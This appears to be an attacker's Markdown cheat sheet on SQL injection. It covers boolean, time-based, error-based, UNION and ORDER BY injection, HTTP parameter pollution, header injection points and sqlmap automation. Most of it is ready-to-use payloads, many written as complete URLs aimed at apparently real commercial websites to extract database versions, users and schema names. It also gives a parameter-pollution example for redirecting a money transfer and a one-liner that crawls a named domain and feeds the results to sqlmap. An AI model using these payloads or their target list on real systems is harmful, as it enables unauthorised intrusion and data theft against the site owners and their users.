# Sql injection

### DB Interaction

```
Forms
Sorting Parameters 
Function Name Parameter
Headers 
```

## injection methods

### Boolean/Time-Based Queries

```
    AND/OR 1=1 
    AND/OR 1=2 
    AND/OR/*test*/720/*test*/LIKE/*test*/720
    AND SUBSTRING(@@version,1,1) > 5
    AND MID(@@version,1,1) < 5 
    AND (100=200 OR 300=400) 
    AND (100 LIKE 200 OR 300 LIKE 400)
    AND SLEEP(10)

    SELECT * FROM posts WHERE id=4-SLEEP(10) -> 4-0 = 4 
    /page.php?id=2-SLEEP(10) 
    -SLEEP/*test*/(10)
    
    SELECT * FROM products WHERE id='10'-sleep(10)%23' 
    ' AND 1=2%23
    " AND 1=2%23
    ') AND 1=2%23
    ") AND 1=2%23

    http://www.senghup.com.my/product.php?id=10%27-sleep(10)%23
    
    product.php?id=13-IF(MID(@@version,1,1)=5,sleep(10),1) -> False -> 13-1=12 
    
    https://www.walsall-locks.co.uk/product.php?id=12
    https://www.walsall-locks.co.uk/product.php?id=13%20and%20(712%20LIKE%20713%20OR%20452%20LIKE%20453)
    https://www.walsall-locks.co.uk/product.php?id=13 and SUBSTRING(@@version,1,1)=5
    https://www.walsall-locks.co.uk/product.php?id=13%20and%20MID(@@version,1,1)=5 -> Boolean-Based Query
    https://www.walsall-locks.co.uk/product.php?id=13-IF(MID(@@version,1,1)=5,sleep(10),1) -> Time-Based Query
    https://www.walsall-locks.co.uk/product.php?id=13-IF(length(database())%3E5,sleep(10),1) 
    http://www.oottru.com/job-description.aspx?id=2%20IF(SUBSTRING(db_name(),1,1)=%27d%27)%20WAITFOR%20DELAY%20%270:0:10%27     
    http://www.senghup.com.my/product.php?id=11%27-IF(MID((SELECT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%200,1),1,1)=%27i%27,sleep(10),1)%23
    
    '| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) |' -> root ->    ?^[m-z] -> 26 
    '& if((MID(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) &'
    'OR if((MID(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) OR'
    'AND if((MID(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) AND'
```

### HPP (HTTP Parameter Pollution)

```
    target.com/transfer.php?from=borna&to=victim&amount=1000 
    target.com/transfer.php?from=attacker&to=victim&from=victim&to=attacker&amount=1000

    PHP + Apache -> last 
    ASP + IIS -> concat 
    Express -> Array 

    target.com/index.asp?id=2&id=3 -> 2,3 

    www.oottru.com/job-description.aspx?id=2; IF(substring(db_name(),1&id=1)='d') WAITFOR DELAY '0:0:10';  
```

### Isomorphic-Based Queries

```
        #INT 
        https://www.walsall-locks.co.uk/product.php?id=12%2bPOW(1,1)
        http://www.oottru.com/job-description.aspx?id=2%2bSQUARE(2)
        ORACLE: BITAND(1,1)

        #String 
        MYSQL: borna 'bo' 'rna' 
        MSSQL:  borna 'bo'+'rna' 
        ORACLE: borna 'bo'||'rna' 
            target.com/index.php?name=borna 
```

### Sorting Parameters

```
        ravin/sqli/e2.php?orderBy=(CASE%20WHEN%20(1=1)%20THEN%20sleep(10)%20ELSE%20real_name%20END)
        (CASE WHEN (length(database())=3) THEN 1 ELSE (SELECT table_name FROM information_schema.tables) END)
        (CASE WHEN (length(database())=3) THEN sleep(10) ELSE (SELECT table_name FROM information_schema.tables) END)
        (CASE%20WHEN(100=100)%20THEN%20sleep(10)%20ELSE%200%20END)
```

### OOB (Out-of-Band)

```
https://notsosecure.com/oob-exploitation-cheatsheet/ 

Headers     
https://outpost24.com/blog/X-forwarded-for-SQL-injection
    User-Agent 
    X-Forwarded-For
    referer 
    cookie 
        lang -> LFI , SQLI 
    cookie 
    https://hackerone.com/reports/761304
```

### UNION-Based

```
http://www.senghup.com.my/product.php?id=-10%27%20UNION%20SELECT%201,2,schema_name,4,5,6,7,8,9,10,11,12%20%20FROM%20information_schema.schemata%23
```

### Error-Based

```
        ' or extractvalue(1,concat(0x7e,database())) or '
        ' AND extractvalue(1,concat(0x7e,database())) AND '
        '| extractvalue(1,concat(0x7e,database())) |'
        '& extractvalue(1,concat(0x7e,database())) &'
```

### Second-Order Injection

INSERT|UPDATE -> SELECT

### Automation sql injection

```
    1) SQLMAP -> crawl + cookie 
    2) SQLMAP + Burp -> SQLipy
    3) wayback 
        python3 paramspider.py -d http://shukomonmouth.co.uk/ -s TRUE -e woff,ttf,eot,svg | deduplicate --sort | httpx -silent | sqlmap
    4) Manual 
```
